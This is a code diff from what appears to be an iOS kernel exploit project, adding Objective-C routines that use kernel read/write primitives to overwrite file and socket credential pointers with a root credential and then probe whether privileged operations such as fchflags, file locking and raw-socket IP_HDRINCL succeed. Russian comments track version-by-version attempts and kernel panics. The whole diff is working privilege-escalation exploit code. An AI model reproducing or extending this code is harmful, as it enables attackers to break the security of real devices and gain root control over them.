@@ -1,3 +1,6 @@
+#import <fcntl.h>
+#import <sys/time.h>
+#import <netinet/in.h>
 #import <sys/stat.h>
 #import "KPDump.h"
 #import "KPLog.h"
@@ -2370,10 +2373,55 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                         if (ch == 0 || ch2 == 0) {
                             kpNote(r, @"=== ROOT (filesystem) WIN: f_cred authorization passes as root ===");
                         }
+                        // 2.0.48: пробы того, что реально слушает f_cred.
+                        // fchmod/fchown авторизуются через cred ПРОЦЕССА (EPERM —
+                        // факт из 2.0.47). Пробуем file-op авторизации:
+                        if (rb == rootZVA) {
+                            struct timeval tv[2]; gettimeofday(&tv[0], NULL); tv[1] = tv[0];
+                            int pFut = futimes(tfd, tv);
+                            int pFlg = fchflags(tfd, 0);
+                            struct flock fl; memset(&fl, 0, sizeof(fl)); fl.l_type = F_WRLCK; fl.l_whence = SEEK_SET;
+                            int pLck = fcntl(tfd, F_SETLK, &fl);
+                            int pFl2 = fcntl(tfd, F_SETFL, O_NONBLOCK);
+                            kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] f_cred-пробы: futimes=%d fchflags=%d F_SETLK=%d F_SETFL=%d errno=%d",
+                                      pFut, pFlg, pLck, pFl2, errno]);
+                            if (pFut == 0 || pFlg == 0 || pLck == 0) {
+                                kpNote(r, @"=== ROOT-FS WIN: хотя бы одна f_cred-авторизация прошла ===");
+                            }
+                        }
                         early_kwrite64(glob + fgOff, old);
                     }
                 }
                 if (tfd >= 0) close(tfd);
+            }
+            // 2.0.48: so_cred свап на НАШЕМ сокете (KRW-примитив). Сокетные
+            // привилегии (bind на низкий порт / IP_HDRINCL) проверяются по so_cred.
+            {
+                extern uint64_t rwSocketPcb;
+                uint64_t sockVA = rwSocketPcb ? kp_untag_ptr(early_kread64(rwSocketPcb + off_inpcb_inp_socket)) : 0;
+                uint64_t sPA = kpLooksLikeKernelPointer(sockVA) ? kvtophys(sockVA & ~0x3fffULL) : 0;
+                int sT = sPA ? kpFrameTypeOf(sPA) : -1;
+                kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] socket=%#llx pagePA=%#llx тип=%d", (unsigned long long)sockVA, (unsigned long long)sPA, sT]);
+                uint32_t socOff = 0xFFFFFFFF;
+                if (kpLooksLikeKernelPointer(sockVA)) {
+                    for (uint32_t o = 0; o + 8 <= 0x300; o += 8)
+                        if (kp_untag_ptr(early_kread64(sockVA + o)) == curUcred) { socOff = o; break; }
+                    kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] so_cred offset=%@",
+                              socOff != 0xFFFFFFFF ? [NSString stringWithFormat:@"+%#x ★", socOff] : @"not found"]);
+                }
+                if (socOff != 0xFFFFFFFF && sT == 0x21 && rootZVA) {
+                    uint64_t old = early_kread64(sockVA + socOff);
+                    early_kwrite64(sockVA + socOff, rootZVA);
+                    uint64_t rb2 = early_kread64(sockVA + socOff);
+                    int one = 1;
+                    int pHdr = setsockopt(controlSocket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
+                    kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] so_cred->root: readback=%#llx IP_HDRINCL=%d errno=%d — %@",
+                              (unsigned long long)rb2, pHdr, errno,
+                              (rb2 == rootZVA && pHdr == 0) ? @"SOCKET-ROOT WIN" : (rb2 == rootZVA ? @"свап держится, проба мимо" : @"не прилипло")]);
+                    early_kwrite64(sockVA + socOff, old);
+                } else {
+                    kpNote(r, @"  [SOATTACK] пропуск: тип не 0x21 или so_cred не найден");
+                }
             }
     return r;
 }
@@ -8381,7 +8429,8 @@ if (0) {  // 2.0.35: записи в cred-пространство выреза�
                     // (rwSocket → socket, наш fileglob) ищем qword == ucF —
                     // это точный оффсет so_cred/fg_cred. Свапаем ТОЛЬКО их.
                     if (rootZVA && ucF) {
-                        extern uint64_t rwSocketPcb;   // kutils.m / kexploit
+                        extern int controlSocket;   // kexploit_opa334.m
+                extern uint64_t rwSocketPcb;   // kutils.m / kexploit
                         kpNote(r, @"  [SELFSWAP] поиск so_cred/fg_cred на наших объектах");
                         if (0) {  // 2.0.34: свапы вырезаны — cr_ref в RO-странице, подмена = zfree-паника
                         // 2.0.33 [SAFESWAP] — refcount-танец. Паники 13:10/13:28:
